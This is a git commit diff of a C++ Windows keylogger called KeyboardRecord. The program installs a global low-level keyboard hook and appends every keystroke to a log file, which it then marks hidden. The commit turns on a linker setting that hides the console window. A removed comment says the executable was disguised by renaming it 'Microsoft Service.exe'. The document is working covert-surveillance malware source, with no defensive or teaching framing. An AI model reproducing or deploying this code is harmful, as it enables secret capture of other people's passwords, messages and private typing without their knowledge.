a60db470d574fdc7d2e299ee9c0005cd13e509d8
what <122537067@qq.com>
2018-08-12 13:37:16 +0800

    添加记录按钮

--- KeyboardRecord/源.cpp
+++ KeyboardRecord/源.cpp
@@ -1,5 +1,5 @@
 #define _WIN32_WINNT 0x0400
-//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")		//隐藏控制台窗口	
+#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	//隐藏控制台窗口
 #include <windows.h>
 #include <Winuser.h>
 #include <string>
@@ -7,98 +7,15 @@
 #include <iostream>
 #include <stdlib.h>
 using namespace std;
+#define CAP 20
 
+bool cap;
+ofstream of;
+MSG msg;
+string r;
+string passage;
 DWORD processid = 0;
 HHOOK hook = 0;
-MSG msg;
-ofstream of;
-string passage;
-char r;
-
-void openfile();
-void closefile();
-
-char translate(int vkCode, int scanCode) {		//处理需要记录的键，其余过滤(未优化)
-	char c;
-
-	if (48 <= vkCode && vkCode <= 57)
-		c = '0' + vkCode - 48;
-	else if (65 <= vkCode && vkCode <= 90)
-		c = 'a' + vkCode - 65;
-
-	else if (vkCode == 8)
-		c = 'X';
-	else if (vkCode == 9)
-		c = 'T';
-	else if (vkCode == 13)
-		c = '\n';
-	else if (vkCode == 20)
-		c = 'C';
-	else if (vkCode == 32)
-		c = ' ';
-	else if (vkCode == 37)
-		c = '<';
-	else if (vkCode == 39)
-		c = '>';
-	else if (vkCode == 160 || vkCode == 161)
-		c = 'S';
-	else if (vkCode == 162 || vkCode == 163)
-		c = '^';
-	else if (vkCode == 164 || vkCode == 165)
-		c = 'A';
-	else if (vkCode == 186)
-		c = ';';
-	else if (vkCode == 187)
-		c = '+';
-	else if (vkCode == 188)
-		c = ',';
-	else if (vkCode == 189)
-		c = '-';
-	else if (vkCode == 190)
-		c = '.';
-	else if (vkCode == 191)
-		c = '/';
-	else if (vkCode == 219)
-		c = '[';
-	else if (vkCode == 220)
-		c = '|';
-	else if (vkCode == 221)
-		c = ']';
-	else if (vkCode == 222)
-		c = '\'';
-	else
-		c = '\0';
-	return c;
-}
-
-
-LRESULT CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam) {	//回调过程接收字符并处理
-	bool flag = false;
-	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lparam; //获得回调的数据
-	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
-		flag = true;
-	if (flag) {
-		cout << translate(p->vkCode, p->scanCode);
-		openfile();
-		of << translate(p->vkCode, p->scanCode);
-		closefile();
-	}
-	return CallNextHookEx(hook, code, wparam, lparam);
-}
-
-void messageloop() {	//消息循环，不断处理消息
-	while (GetMessage(&msg, NULL, 0, 0)) {
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
-	};
-}
-
-void sethook() {	//建立钩子
-	processid = GetCurrentThreadId();
-	hook = SetWindowsHookEx(WH_KEYBOARD_LL, &hookproc, GetModuleHandle(NULL), 0);
-	if (hook == NULL)
-		exit(0);
-}
 
 void openfile() {
 	of.open("log.txt", ios::app);
@@ -110,8 +27,107 @@ void closefile() {
 	of.close();
 }
 
+string translate(int vkCode, int scanCode) {
+	string s;
+	if (48 <= vkCode && vkCode <= 57)
+		s = '0' + vkCode - 48;
+	else if (65 <= vkCode && vkCode <= 90 && cap)
+		s = 'A' + vkCode - 65;
+	else if (65 <= vkCode && vkCode <= 90 && !cap)
+		s = 'a' + vkCode - 65;
 
-int main() {	//程序名改为"Microsoft Service.exe"进行伪装
+	else if (vkCode == 8)
+		s = "[Backspace]";
+	else if (vkCode == 9)
+		s = "[Tab]";
+	else if (vkCode == 13 || vkCode == 108)
+		s = "\n";
+	else if (vkCode == cap)
+		s = "[Caps Lock]";
+	else if (vkCode == 32)
+		s = ' ';
+	else if (vkCode == 37)
+		s = "[<-]";
+	else if (vkCode == 39)
+		s = "[->]";
+	else if (vkCode == 41)
+		s = '`';
+	else if (vkCode == 106)
+		s = '*';
+	else if (vkCode == 107)
+		s = '+';
+	else if (vkCode == 109)
+		s = '-';
+	else if (vkCode == 110)
+		s = '.';
+	else if (vkCode == 111)
+		s = '/';
+	else if (vkCode == 160 || vkCode == 161)
+		s = "[Shift]";
+	else if (vkCode == 162 || vkCode == 163)
+		s = "[Ctrl]";
+	else if (vkCode == 164 || vkCode == 165)
+		s = "[Alt]";
+	else if (vkCode == 186)
+		s = ';';
+	else if (vkCode == 187)
+		s = '+';
+	else if (vkCode == 188)
+		s = ',';
+	else if (vkCode == 189)
+		s = '-';
+	else if (vkCode == 190)
+		s = '.';
+	else if (vkCode == 191)
+		s = '/';
+	else if (vkCode == 219)
+		s = '[';
+	else if (vkCode == 220)
+		s = '\\';
+	else if (vkCode == 221)
+		s = ']';
+	else if (vkCode == 222)
+		s = '\'';
+	else
+		s = '\0';
+	return s;
+}
+
+LRESULT CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam) {
+	bool flag = false;
+	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lparam; //获取回调函数
+	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)	//检测键盘输入
+		flag = true;
+	if (wparam == WM_KEYDOWN && p->vkCode == CAP) {		//检测键盘Cap和Shift状态
+		cap = !cap;
+		openfile();
+		of << "[Caps Lock]";
+		closefile();
+	}
+	if (flag) {
+		openfile();
+		of << translate(p->vkCode, p->scanCode);
+		closefile();
+	}
+	::SetFileAttributes("log.txt", FILE_ATTRIBUTE_HIDDEN);	//增加隐藏文件属性
+	return CallNextHookEx(hook, code, wparam, lparam);
+}
+
+void messageloop() {
+	while (GetMessage(&msg, NULL, 0, 0)) {
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	};
+}
+
+void sethook() {
+	processid = GetCurrentThreadId();
+	hook = SetWindowsHookEx(WH_KEYBOARD_LL, &hookproc, GetModuleHandle(NULL), 0);
+	if (hook == NULL)
+		exit(0);
+}
+
+int main() {
 	sethook();
 	messageloop();
 	UnhookWindowsHookEx(hook);
